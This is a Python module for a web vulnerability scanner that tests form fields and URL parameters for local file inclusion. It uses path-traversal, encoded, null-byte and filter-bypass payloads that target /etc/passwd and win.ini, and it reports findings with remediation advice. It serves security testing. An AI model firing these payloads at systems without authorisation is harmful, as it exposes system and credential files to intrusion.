"""
LFI (Local File Inclusion) Scanner
"""

import asyncio
import re
from typing import List, Dict, Any
from urllib.parse import urlencode, urlparse, parse_qs
from ..utils.data_loader import data_loader


class LFIScanner:
    """Scanner for Local File Inclusion vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize LFI scanner"""
        self.config = config
        self.session = session
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[Dict[str, Any]]:
        """Load LFI payloads from data files"""
        # Load sensitive files from data directory
        linux_files = data_loader.load_sensitive_files_linux()
        windows_files = data_loader.load_sensitive_files_windows()
        
        payloads = []
        
        # Create payloads for Linux files
        for file_path in linux_files:
            payloads.append({
                'payload': file_path,
                'type': 'linux',
                'evidence': ['root:', 'bin/bash', 'localhost', '127.0.0.1', 'PATH=', 'HOME=']
            })
            
            # Add traversal variants
            for depth in range(1, 7):
                traversal = '../' * depth
                payloads.append({
                    'payload': traversal + file_path.lstrip('/'),
                    'type': 'linux',
                    'evidence': ['root:', 'bin/bash', 'localhost', '127.0.0.1', 'PATH=', 'HOME=']
                })
        
        # Create payloads for Windows files
        for file_path in windows_files:
            payloads.append({
                'payload': file_path,
                'type': 'windows',
                'evidence': ['[extensions]', 'for 16-bit app support', 'localhost']
            })
            
            # Add traversal variants
            for depth in range(1, 5):
                traversal = '..\\' * depth
                # Remove drive letter for traversal
                path_without_drive = file_path.split('\\', 1)[1] if '\\' in file_path else file_path
                payloads.append({
                    'payload': traversal + path_without_drive,
                    'type': 'windows',
                    'evidence': ['[extensions]', 'for 16-bit app support', 'localhost']
                })
        
        # Add encoded and special payloads
        encoded_payloads = [
            {'payload': '%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'type': 'linux-encoded', 'evidence': ['root:']},
            {'payload': '..%2f..%2fetc%2fpasswd', 'type': 'linux-encoded', 'evidence': ['root:']},
            
            # Null byte injection
            {'payload': '../../../etc/passwd%00', 'type': 'linux-null', 'evidence': ['root:']},
            {'payload': '../../../etc/passwd%00.jpg', 'type': 'linux-null', 'evidence': ['root:']},
            
            # Filter bypass
            {'payload': '....//....//etc/passwd', 'type': 'linux-bypass', 'evidence': ['root:']},
            {'payload': '..;/..;/etc/passwd', 'type': 'linux-bypass', 'evidence': ['root:']},
        ]
        
        payloads.extend(encoded_payloads)
        
        # If no files loaded, return basic payloads
        if not payloads:
            payloads = [
                # Linux/Unix
                {'payload': '/etc/passwd', 'type': 'linux', 'evidence': ['root:', 'bin/bash']},
                {'payload': '../etc/passwd', 'type': 'linux', 'evidence': ['root:', 'bin/bash']},
                {'payload': '../../etc/passwd', 'type': 'linux', 'evidence': ['root:', 'bin/bash']},
                {'payload': '../../../etc/passwd', 'type': 'linux', 'evidence': ['root:', 'bin/bash']},
                
                # Windows
                {'payload': 'C:\\windows\\win.ini', 'type': 'windows', 'evidence': ['[extensions]']},
                {'payload': '..\\windows\\win.ini', 'type': 'windows', 'evidence': ['[extensions]']},
            ]
        
        return payloads
    
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan for LFI vulnerabilities"""
        vulnerabilities = []
        
        # Scan forms
        for form in recon_data.get('forms', []):
            form_vulns = await self._scan_form(target, form)
            vulnerabilities.extend(form_vulns)
        
        # Scan URL parameters
        for param in recon_data.get('inputs', []):
            if param.get('type') == 'url_param':
                param_vulns = await self._scan_url_param(target, param)
                vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    async def _scan_form(self, base_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan form for LFI"""
        vulnerabilities = []
        
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        
        # Build form URL
        if action:
            from urllib.parse import urljoin
            form_url = urljoin(base_url, action)
        else:
            form_url = base_url
        
        # Look for file-related parameters
        for input_field in form.get('inputs', []):
            input_name = input_field.get('name', '').lower()
            
            # Check if field might be vulnerable to LFI
            lfi_indicators = ['file', 'path', 'page', 'include', 'dir', 'document', 'folder', 'pg', 'template']
            if not any(indicator in input_name for indicator in lfi_indicators):
                continue
            
            # Test with LFI payloads
            for payload_info in self.payloads[:10]:  # Top 10 payloads
                payload = payload_info['payload']
                payload_type = payload_info['type']
                evidence_patterns = payload_info['evidence']
                
                try:
                    # Build form data
                    form_data = {}
                    for inp in form.get('inputs', []):
                        inp_name = inp.get('name')
                        if inp_name:
                            if inp_name == input_field.get('name'):
                                form_data[inp_name] = payload
                            else:
                                form_data[inp_name] = inp.get('value', 'test')
                    
                    # Send request
                    if method == 'POST':
                        async with self.session.post(form_url, data=form_data) as response:
                            content = await response.text()
                    else:
                        async with self.session.get(form_url, params=form_data) as response:
                            content = await response.text()
                    
                    # Check for LFI
                    if self._is_vulnerable(content, evidence_patterns):
                        vulnerabilities.append({
                            'type': 'lfi',
                            'severity': 'high',
                            'url': form_url,
                            'method': method,
                            'parameter': input_field.get('name'),
                            'payload': payload,
                            'lfi_type': payload_type,
                            'description': f'Local File Inclusion found in form parameter "{input_field.get("name")}"',
                            'evidence': self._extract_evidence(content, evidence_patterns),
                            'remediation': 'Use whitelist validation for file paths and avoid user input in file operations',
                            'cwe': 'CWE-98',
                            'owasp': 'A03:2021 - Injection',
                        })
                        break
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    async def _scan_url_param(self, url: str, param: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan URL parameter for LFI"""
        vulnerabilities = []
        
        param_name = param.get('name', '').lower()
        
        # Check if parameter might be vulnerable to LFI
        lfi_indicators = ['file', 'path', 'page', 'include', 'dir', 'document', 'folder', 'pg', 'template']
        if not any(indicator in param_name for indicator in lfi_indicators):
            return vulnerabilities
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test with LFI payloads
        for payload_info in self.payloads[:10]:
            payload = payload_info['payload']
            payload_type = payload_info['type']
            evidence_patterns = payload_info['evidence']
            
            try:
                # Build test URL
                test_params = params.copy()
                test_params[param.get('name')] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                # Send request
                async with self.session.get(test_url) as response:
                    content = await response.text()
                
                # Check for LFI
                if self._is_vulnerable(content, evidence_patterns):
                    vulnerabilities.append({
                        'type': 'lfi',
                        'severity': 'high',
                        'url': test_url,
                        'method': 'GET',
                        'parameter': param.get('name'),
                        'payload': payload,
                        'lfi_type': payload_type,
                        'description': f'Local File Inclusion found in URL parameter "{param.get("name")}"',
                        'evidence': self._extract_evidence(content, evidence_patterns),
                        'remediation': 'Use whitelist validation for file paths and avoid user input in file operations',
                        'cwe': 'CWE-98',
                        'owasp': 'A03:2021 - Injection',
                    })
                    break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def _is_vulnerable(self, content: str, evidence_patterns: List[str]) -> bool:
        """Check if LFI vulnerability exists"""
        content_lower = content.lower()
        
        # Check if any evidence pattern is found
        for pattern in evidence_patterns:
            if pattern.lower() in content_lower:
                return True
        
        return False
    
    def _extract_evidence(self, content: str, evidence_patterns: List[str], max_length: int = 300) -> str:
        """Extract evidence of LFI"""
        for pattern in evidence_patterns:
            if pattern.lower() in content.lower():
                try:
                    index = content.lower().index(pattern.lower())
                    start = max(0, index - 50)
                    end = min(len(content), index + len(pattern) + 100)
                    return content[start:end]
                except ValueError:
                    continue
        
        # Return first part of content as evidence
        return content[:max_length] if len(content) > max_length else content
